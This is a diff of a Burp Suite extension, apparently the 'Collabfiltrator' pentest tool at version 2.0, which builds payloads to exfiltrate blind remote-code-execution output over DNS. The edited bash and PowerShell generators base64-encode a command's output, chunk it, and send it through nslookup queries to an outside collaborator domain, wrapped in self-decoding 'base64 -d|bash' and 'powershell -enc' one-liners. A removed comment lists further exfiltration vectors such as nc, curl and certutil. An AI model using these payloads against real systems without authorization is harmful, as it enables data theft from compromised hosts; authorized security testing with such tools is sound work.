@@ -1,11 +1,3 @@
-'''
-TODO
-encrypt DNS exfil (PKI attacker holds private key, deploys public key to victim)
-select several DNS exfil vectors (nslookup, dig, host, ping, wget, curl, python, perl, scp, sftp, ftp, ssh, telnet, rsh, nc, ruby)(certutil, wget, bitsadmin?, python, perl, ftp, sftp, smb, ruby, net use)
-
-Ideas 4/3/2020 
-'''
-
 #Import Burp Objects
 from burp import IBurpExtender, IBurpExtenderCallbacks, ITab, IBurpCollaboratorInteraction
 #Import Java GUI Objects
@@ -18,23 +10,31 @@ try:
     from exceptions_fix import FixBurpExceptions
 except ImportError:
     pass
-    
+
+t = "" # declare thread globally so we can stop it from any function
+stopThreads = False # Thread Tracker to prevent dangling threads
+
 class BurpExtender (IBurpExtender, ITab, IBurpCollaboratorInteraction, IBurpExtenderCallbacks):
     # Extention information
     EXT_NAME = "Collabfiltrator"
     EXT_DESC = "Exfiltrate blind remote code execution output over DNS via Burp Collaborator."
-    EXT_AUTHOR = "Adam Logue, Frank Scarpella, Jared McLaren"
+    EXT_AUTHOR = "Adam Logue, Frank Scarpella, Jared McLaren, Ryan Griffin"
+    EXT_VERSION = "2.0"
     # Output info to the Extensions console and register Burp API functions
     def registerExtenderCallbacks(self, callbacks):
         print "Name: \t\t"      + BurpExtender.EXT_NAME
         print "Description: \t" + BurpExtender.EXT_DESC
         print "Authors: \t"      + BurpExtender.EXT_AUTHOR
+        print "Version: \t" + BurpExtender.EXT_VERSION
         # Required for easier debugging:
         # https://github.com/securityMB/burp-exceptions
         sys.stdout = callbacks.getStdout()
         self._callbacks = callbacks
         self._helpers   = callbacks.getHelpers()
         callbacks.setExtensionName(BurpExtender.EXT_NAME)
+
+        self.killDanglingThreadsOnUnload = callbacks.registerExtensionStateListener(self.killDanglingThreads)
+
 
         #Create Burp Collaborator Instance
         self.burpCollab  = self._callbacks.createBurpCollaboratorClientContext()
@@ -58,16 +58,15 @@ class BurpExtender (IBurpExtender, ITab, IBurpCollaboratorInteraction, IBurpExte
         self.t1r1 = swing.JPanel(FlowLayout())
         self.t1r2 = swing.JPanel(FlowLayout())
         self.t1r3 = swing.JPanel(FlowLayout())
-        self.t1r4 = swing.JPanel(FlowLayout())
         self.t1r5 = swing.JPanel(FlowLayout())
-        self.t1r6 = swing.JPanel(FlowLayout())
         self.t1r7 = swing.JPanel(FlowLayout())
-
+        self.t1r4 = swing.JPanel(FlowLayout())
+        self.t1r6 = swing.JPanel(FlowLayout())
         
         # Now add content to the first tab's GUI objects
         self.osComboBox = swing.JComboBox(["Windows", "Linux"])
-        #self.commandTxt = swing.JTextField("ls -lah", 35)
-        self.commandTxt = swing.JTextField("dir C:\inetpub\wwwroot", 35)
+        self.commandTxt = swing.JTextField("hostname", 35)
+        #self.commandTxt = swing.JTextField("dir c:\inetpub\wwwroot", 35)
         self.payloadTxt = swing.JTextArea(10,50)
         self.payloadTxt.setBackground(Color.lightGray)
         self.payloadTxt.setEditable(False)# So you can't messup the generated payload
@@ -95,20 +94,25 @@ class BurpExtender (IBurpExtender, ITab, IBurpCollaboratorInteraction, IBurpExte
         self.t1r2.add(swing.JButton("Execute", actionPerformed=self.executePayload))
         self.t1r3.add(swing.JLabel("Payload"))
         self.t1r3.add(self.payloadTxt)
-        self.t1r6.add(self.burpCollaboratorDomainTxt) #burp Collab Domain will go here
-        self.t1r4.add(swing.JButton("Copy Payload to Clipboard", actionPerformed=self.copyToClipboard))
-        self.t1r5.add(swing.JLabel("Output"))
-        self.t1r5.add(self.outputScroll) #add output scroll bar to page
-        self.t1r7.add(self.progressBar)
-        
+        self.t1r4.add(self.burpCollaboratorDomainTxt) #burp Collab Domain will go here
+        self.t1r5.add(swing.JButton("Copy Payload to Clipboard", actionPerformed=self.copyToClipboard))
+        self.t1r6.add(self.progressBar)
+        self.stopListenerButton = swing.JButton("Stop Listener", actionPerformed=self.stopListener)
+        self.stopListenerButton.setVisible(False) # hide stopListenerButton
+        self.t1r6.add(self.stopListenerButton)
+        self.t1r7.add(swing.JLabel("Output"))
+        self.t1r7.add(self.outputScroll) #add output scroll bar to page
+        self.t1r7.add(swing.JButton("Clear Output", actionPerformed=self.clearOutput))
+
+
         # Add the GUI objects into the first tab
         self.collabfiltratorTab.add(self.t1r1)
         self.collabfiltratorTab.add(self.t1r2)
         self.collabfiltratorTab.add(self.t1r3)
-        self.collabfiltratorTab.add(self.t1r6)
         self.collabfiltratorTab.add(self.t1r4)
-        self.collabfiltratorTab.add(self.t1r7)
         self.collabfiltratorTab.add(self.t1r5)
+        self.collabfiltratorTab.add(self.t1r6)
+        self.collabfiltratorTab.add(self.t1r7)
         
         # Create objects for the second tab's GUI
         self.dummylabel = swing.JLabel("Burp Collaborator Config options will go here.")
@@ -121,9 +125,10 @@ class BurpExtender (IBurpExtender, ITab, IBurpCollaboratorInteraction, IBurpExte
         self.t1r1.setMaximumSize(Dimension(800, 100))
         self.t1r2.setMaximumSize(Dimension(800, 50))
         self.t1r3.setMaximumSize(Dimension(800, 200))
-        self.t1r4.setMaximumSize(Dimension(800, 200))
+        self.t1r4.setMaximumSize(Dimension(800, 50))
+        self.t1r5.setMaximumSize(Dimension(800, 50))
         self.t1r6.setMaximumSize(Dimension(800, 50))
-        self.t1r7.setMaximumSize(Dimension(800, 50))
+        self.t1r7.setMaximumSize(Dimension(700, 2500))
 
         #Register the panel in the Burp GUI
         callbacks.addSuiteTab(self)
@@ -138,16 +143,28 @@ class BurpExtender (IBurpExtender, ITab, IBurpCollaboratorInteraction, IBurpExte
         return self.tab
 
     def createBashBase64Payload(self, linuxCommand):
-        bashCommand = '''i=0;d="''' + self.collaboratorDomain + '''";z=$(for j in $(''' + linuxCommand +''' |base64);do echo $j;done);for j in $(echo $z|sed 's/$/E-F/'|sed -r 's/(.{63})/\\1\\n/g'|sed 's/=/-/g'|sed 's/+/PLUS/g'); do nslookup `printf "%04d" $i`.$j.$d;i=$((i+1));done;'''
-        return "echo " + self._helpers.base64Encode(bashCommand) + "|openssl base64 -d |sh"
+        bashCommand = '''i=0;d="''' + self.collaboratorDomain + '''";''' + linuxCommand + '''|base64 -w57|sed -r 's/$//g;s/=/-/g;s/\\+/PLUS/g'|while read j;do nslookup "$(printf '%04d' $i).$j.$d";((i++));done'''
+        return "echo " + self._helpers.base64Encode(bashCommand) + "|base64 -d |bash"
 
     # Create windows powershell base64 payload
     def createPowershellBase64Payload(self, windowsCommand):
-        powershellCommand = '''$s=63;$d=".''' + self.collaboratorDomain + '''";$b=[Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes((''' + windowsCommand + ''')));$b+="E-F";$c=[math]::floor($b.length/$s);0..$c|%{$e=$_*$s;$r=$(try{$b.substring($e,$s)}catch{$b.substring($e)}).replace("=","-").replace("+","PLUS");$c=$_.ToString().PadLeft(4,"0");nslookup $c"."$r$d;}'''
+        powershellCommand = '''$s=63;$d=".''' + self.collaboratorDomain + '''";$b=[Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes((''' + windowsCommand + ''')));$c=[math]::floor($b.length/$s);0..$c|%{$e=$_*$s;$r=$(try{$b.substring($e,$s)}catch{$b.substring($e)}).replace("=","-").replace("+","PLUS");$c=$_.ToString().PadLeft(4,"0");nslookup $c"."$r$d;}'''
         return "powershell -enc " + self._helpers.base64Encode(powershellCommand.encode("UTF-16-LE"))
+
+    def killDanglingThreads(self):
+        global stopThreads
+        global t
+        stopThreads = True
+        try:
+            t.join() #rejoin the thread so it detects the stopThreads and exits gracefully
+        except:
+            pass
+        stopThreads = False #Reset the threadTracker so we can run it again
+        return
     
     # return generated payload to payload text area
     def executePayload(self, event):
+        self.killDanglingThreads()
         self.collaboratorDomain = self.burpCollab.generatePayload(True)#rerun to regenrate new collab domain
         burpCollabInstance = self.burpCollab
         domain = self.collaboratorDomain # show domain in UI
@@ -159,7 +176,18 @@ class BurpExtender (IBurpExtender, ITab, IBurpCollaboratorInteraction, IBurpExte
         self.checkCollabDomainStatusWrapper(domain, burpCollabInstance )
         return
 
+    def stopListener(self, event): #killDanglingThreads, but as a buttonEvent
+        self.killDanglingThreads()
+        return
+
+    def clearOutput(self, event): 
+        self.outputTxt.setText("") #clear out output text because button was clicked     
+        return  
+
     def checkCollabDomainStatusWrapper(self, domain, burpCollab):
+        global stopThreads
+        threadFinished = False
+        global t
         t = threading.Thread(target=self.checkCollabDomainStatus, args=(domain, burpCollab)) #comma has to be here even with only 1 arg because it expects a tuple
         t.start()
         return # thread doesn't stop locking in execute button
@@ -180,15 +208,18 @@ class BurpExtender (IBurpExtender, ITab, IBurpCollaboratorInteraction, IBurpExte
         #recordType = "MX" #00 ?
         sameCounter = 0 #if this gets to 5, it means our data chunks coming in have been the same for 5 iterations and no new chunks are coming in so we can end the while loop.
 
-        # Break the never ending loop
-        loopCount = 0
-        maxLoops = 60
-        while (complete is False) and (loopCount <= maxLoops): #Only way I could figure out how to break out of this damn thing.
+        global stopThreads
+        while (stopThreads == False):
+            if stopThreads == True:
+                self.progressBar.setVisible(False) #stop progress bar
+                self.t1r6.setVisible(False) # hide progressbar
+                self.stopListenerButton.setVisible(False) # hide stopListenerButton
+                stopThreads = False # reset StopThreads
+                break
             self.progressBar.setVisible(True) #show progress bar
             self.progressBar.setIndeterminate(True) #make progress bar show listener is running
+            self.stopListenerButton.setVisible(True) # show stopListenerButton
             check = objCollab.fetchCollaboratorInteractionsFor(domain)
-            time.sleep(1)
-            loopCount += 1
             oldkeys = DNSrecordDict.keys()
 
             for i in range(0, len(check)):
@@ -198,22 +229,27 @@ class BurpExtender (IBurpExtender, ITab, IBurpCollaboratorInteraction, IBurpExte
                 subdomain = ''.join(chr (x) for x in dnsQuery[18:(18+dnsOffset)])
                 chunk = ''.join(chr (x) for x in dnsQuery[13:(13+preambleOffset)])
                 DNSrecordDict[chunk] = subdomain #line up preamble with subdomain containing data
-            
-            ### Check if input stream is done.
+
             keys = DNSrecordDict.keys()
+
+            ### Check if input stream is done.
             if keys == oldkeys and keys != []:
                 sameCounter += 1
             elif keys != oldkeys and keys != []:
                 sameCounter = 0
-            if sameCounter == 5:
-                complete = True
-            if loopCount == 61:
-                self.outputTxt.setText("Error: Listener Timeout." + "\n")
+            if sameCounter == 5: #if the data is the same 5 times then no more nslookups are coming in
+                stopThreads = True
+
         self.progressBar.setVisible(False) # hide progressbar
         self.progressBar.setIndeterminate(False) #turn off progressbar
+        self.stopListenerButton.setVisible(False) # hide stopListenerButton
+
 
         output = showOutput(DNSrecordDict)
-        self.outputTxt.append(output + "\n") #print output to payload box
+        
+
+        self.outputTxt.append("Command: " +self.commandTxt.getText() + "\n\n"  + output + "\n") #print output to payload box
+
         self.outputTxt.setCaretPosition(self.outputTxt.getDocument().getLength()) # make sure scrollbar is pointing to bottom
         self.payloadTxt.setText("") #clear out payload box because listener has stopped     
         return
@@ -221,12 +257,11 @@ class BurpExtender (IBurpExtender, ITab, IBurpCollaboratorInteraction, IBurpExte
 
 def showOutput(outputDict):
     completedInputString = ""
-    for k,v in outputDict.items():
-        if "E-F" in v:
-            for chunk in (sorted(outputDict.items())): #Sort by preamble number to put data in order 
-                completedInputString += chunk[1] # DNSrecordDict.items() returns a tuple so take value from the dict and append it to completedInputString.
-    output = completedInputString[:-3].replace('-','=').replace('PLUS','+') # drop EOF marker and replace any - padding with = and fix PLUSes
-    output = base64.b64decode(output)     
+    for chunk in (sorted(outputDict.items())): #Sort by preamble number to put data in order 
+        completedInputString += chunk[1] # DNSrecordDict.items() returns a tuple so take value from the dict and append it to completedInputString
+    output = completedInputString.replace('-','=').replace('PLUS','+') # drop EOF marker and replace any - padding with = and fix PLUSes
+    output = base64.b64decode(output)
+        
     return output
 
 
